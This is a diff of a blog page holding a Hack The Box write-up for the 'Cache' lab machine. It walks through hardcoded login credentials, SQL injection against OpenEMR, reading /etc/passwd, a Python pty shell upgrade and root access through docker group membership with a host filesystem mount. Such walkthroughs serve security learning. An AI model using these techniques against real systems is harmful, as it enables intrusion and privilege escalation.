@@ -19,7 +19,7 @@
     <meta property="og:url" content="https://inesmartins.github.io//htb-write-up-cache/" />
     <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/10/cache.png" />
     <meta property="article:published_time" content="2020-10-22T08:51:40.000Z" />
-    <meta property="article:modified_time" content="2020-10-22T08:53:06.000Z" />
+    <meta property="article:modified_time" content="2020-10-22T09:02:44.000Z" />
     <meta property="article:tag" content="htb" />
     <meta property="article:tag" content="linux" />
     <meta property="article:tag" content="cache" />
@@ -71,7 +71,7 @@
     "headline": "HTB Write-up | Cache",
     "url": "https://inesmartins.github.io//htb-write-up-cache/",
     "datePublished": "2020-10-22T08:51:40.000Z",
-    "dateModified": "2020-10-22T08:53:06.000Z",
+    "dateModified": "2020-10-22T09:02:44.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "https://inesmartins.github.io//content/images/2020/10/cache.png",
@@ -138,28 +138,17 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Cache
 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 554/tcp)
-HOP RTT      ADDRESS
-1   41.51 ms 10.10.14.1
-2   41.62 ms cache.htb (10.10.10.188)
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 26.69 seconds
 </code></pre>
-<p>The website hosted on cache.htb is very simple: there are only a couple of HTML pages with some text about hacking.</p><figure class="kg-card kg-image-card"></figure><p>There's also a very simple <a href="http://10.10.10.188/login.html">Login page</a>:</p><figure class="kg-card kg-image-card"></figure><p>The credentials for this authentication form are hardcoded on a <a href="http://10.10.10.188/jquery/functionality.js">JS file</a>:</p><pre><code>user: ash
+<p>The website hosted on <code>cache.htb</code> is very simple: there are only a couple of HTML pages with some text about hacking.</p><figure class="kg-card kg-image-card"></figure><p>There's also a very simple <a href="http://cache.htb/login.html">Login page</a>:</p><figure class="kg-card kg-image-card"></figure><p>The credentials for this authentication form are hardcoded on a <a href="http://cache.htb/jquery/functionality.js">JS file</a>:</p><pre><code>user: ash
 password: H@v3_fun
 </code></pre>
-<p>Using these credentials on the form we're redirected to the <a href="http://10.10.10.188/net.html">Net page</a>, which doesn't seem to have anything of relevance.</p><figure class="kg-card kg-image-card"></figure><p>The <a href="http://10.10.10.188/author.html">Author page</a>, on the other hand, seems to have some interesting information:</p><pre><code class="language-html">&lt;div class="card"&gt;
+<p>Using these credentials on the form we're redirected to the <a href="http://cache.htb/net.html">Net page</a>, which doesn't seem to have anything of relevance.</p><figure class="kg-card kg-image-card"></figure><p>The <a href="http://cache.htb/author.html">Author page</a>, on the other hand, seems to have some interesting information:</p><pre><code class="language-html">&lt;div class="card"&gt;
   &lt;img src="logo1.jpg" alt="John" style="width:100%"&gt;
   &lt;h1&gt;ASH&lt;/h1&gt;
   &lt;p class="title"&gt;CEO &amp; Founder, CACHE&lt;/p&gt;
   &lt;a href="http://cache.htb"&gt;cache.htb&lt;/a&gt;
   &lt;h3&gt;&lt;font color="Grey"&gt;ASH is a Security Researcher (Threat Research Labs), Security Engineer. Hacker, Penetration Tester and Security blogger. He is Editor-in-Chief, Author &amp; Creator of Cache. Check out his other projects like Cache:&lt;p&gt; HMS(Hospital Management System)
-&lt;/font&gt;&lt;/h3&gt; </code></pre><p>So, a couple of interesting things:</p><ul><li>the CEO and Founder of CACHE is someone named ASH (also maybe John according to the alt tag);</li><li>ASH is also the creator of another project called HMS;</li></ul><p>I was certain that HMS was an important clue, but wasn't completely sure how to access it. That is until I realised that it's possible to <strong>host multiple domains on the same Apache server </strong>which are accessible only when you navigate to the correct URL. Since our machine isn't available on the Internet, we can display this other website by changing our /etc/hosts configuration:</p><pre><code>10.10.10.188 hms.htb
+&lt;/font&gt;&lt;/h3&gt; </code></pre><p>So, a couple of interesting things:</p><ul><li>the CEO and Founder of CACHE is someone named ASH (also maybe John according to the alt tag);</li><li>ASH is also the creator of another project called HMS;</li></ul><p>I was certain that HMS was an important clue, but wasn't completely sure how to access it. That is until I realised that it's possible to <strong>host multiple domains on the same Apache server </strong>which are accessible only when you navigate to the correct URL. So, in order to display this other website, all we have to do is change our <code>/etc/hosts</code> configuration:</p><pre><code>10.10.10.188 hms.htb
 </code></pre>
 <h2 id="exploiting-openemr-vulnerabilities">Exploiting OpenEMR Vulnerabilities</h2><p>When we access <a href="http://hms.htb/">hms.htb</a> we're redirected to a <a href="http://hms.htb/interface/login/login.php?site=default">login page</a> for <a href="https://www.open-emr.org/">OpenEMR</a>, which is an "open source electronic health records and medical practice management solution".</p><figure class="kg-card kg-image-card"></figure><p>Turns out OpenEMR has a lot of well-known vulnerabilities, which are very thoroughly detailed <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">here</a>.</p><p>As indicated on these docs, we can check the <a href="http://hms.htb/admin.php">admin.php</a> file for the exact version of the application:</p><figure class="kg-card kg-image-card"></figure><p>This version is vulnerable to multiple SQL Injection vulnerabilities. There's actually a very good <a href="https://www.youtube.com/watch?time_continue=115&amp;v=DJSQ8Pk_7hc&amp;feature=emb_logo">video tutorial</a> for this exploit, but in very simple terms it works as follows:</p><ol><li>capture the GET request to a <a href="http://hms.htb/portal/add_edit_event_user.php">portal page</a> with <a href="https://portswigger.net/burp">Burp</a> or any other proxy;</li><li>copy that request to a file and then add a parameter (?eid=1) to the URL:</li></ol><pre><code>~ sudo nano openemr.req
 
@@ -223,11 +212,11 @@ luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
 memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
 mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
 </code></pre>
-<p>There are 2 interesting users: ash and luffy:</p><ul><li>ash we already know - he's the CEO of both Cache and HMS. </li><li>luffy, however, means nothing to us at this point, but this is the name of a <a href="https://en.wikipedia.org/wiki/One_Piece">OnePiece</a> character, which combined with the image on the <a href="http://10.10.10.188/net.html">Net page</a> page might be a little clue.</li></ul><h3 id="using-su">Using su</h3><p>We now have a couple of credentials that we want to test for both ash and luffy, however when we try to use su, we get the following error message:</p><pre><code>www-data@cache:/var/www/hms.htb/public_html$ su -u ash
+<p>There are 2 interesting users: <strong>ash</strong> and <strong>luffy</strong>:</p><ul><li>ash we already know - they're the CEO of both Cache and HMS. </li><li>luffy, however, means nothing to us at this point (but this is the name of a <a href="https://en.wikipedia.org/wiki/One_Piece">OnePiece</a> character, which combined with the image on the <a href="http://10.10.10.188/net.html">Net page</a> page might be a little clue).</li></ul><h3 id="using-su">Using su</h3><p>We now have a couple of credentials that we want to test for both ash and luffy, however when we try to use su, we get the following error message:</p><pre><code>www-data@cache:/var/www/hms.htb/public_html$ su -u ash
 su -u ash
 su: must be run from a terminal
 </code></pre>
-<p>After some Googling we understand that this means this machine is running inside a<a href="https://www.docker.com/"> </a>container. <a href="https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal">This StackOverflow answer</a> helps us go around this with a <a href="https://netsec.ws/?p=337">TTY shell</a>:</p><pre><code>www-data@cache:$ echo "import pty; pty.spawn('/bin/bash')" &gt; /tmp/abc.py
+<p>After some Googling I realised that this means this machine is running inside a<a href="https://www.docker.com/"> </a>container. <a href="https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal">This StackOverflow answer</a> helped me go around it by using a <a href="https://netsec.ws/?p=337">TTY shell</a>:</p><pre><code>www-data@cache:$ echo "import pty; pty.spawn('/bin/bash')" &gt; /tmp/abc.py
 www-data@cache:$ python3 /tmp/abc.py
 www-data@cache:$ rm /tmp/abc.py
 www-data@cache:$ su - ash
@@ -278,7 +267,7 @@ ash@cache:~$
  [ + ]  unattended-upgrades
  [ - ]  uuidd
 </code></pre>
-<p>Because of the name of the machine we decided to start by checking out the process in which <a href="https://memcached.org/">memcached</a> is running:</p><pre><code>ash@cache:~$ ps aux | grep memcached
+<p>Because of the name of the machine I decided to start by checking out the process in which <a href="https://memcached.org/">memcached</a> is running:</p><pre><code>ash@cache:~$ ps aux | grep memcached
 
 memcache   961  0.0  0.0 425792  4032 ?        Ssl  14:07   0:02 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
 ash       7525  0.0  0.0 416308  2480 pts/5    Sl+  16:25   0:00 memcached
@@ -372,7 +361,7 @@ END
 </tr>
 </tbody>
 </table>
-<p>There's only 1 image we can run - ubuntu. Now we can mount our machine's entire filesystem on a new container (by specifying the <code>-v</code> argument) and then spawn a TTY to access it.</p><pre><code>luffy@cache:~$ docker run -v /:/mnt/root -ti ubuntu
+<p>There's only 1 image we can run: <strong>ubuntu</strong>. Now we can mount our machine's entire filesystem on a new container (by specifying the <code>-v</code> argument) and then spawn a TTY to access it.</p><pre><code>luffy@cache:~$ docker run -v /:/mnt/root -ti ubuntu
 </code></pre>
 <p>Since we're root, we can print the root flag from its relative path to the mount point.</p><pre><code>root@a5d39b0a924a:/# cat /mnt/root/root/root.txtcat 
 </code></pre>
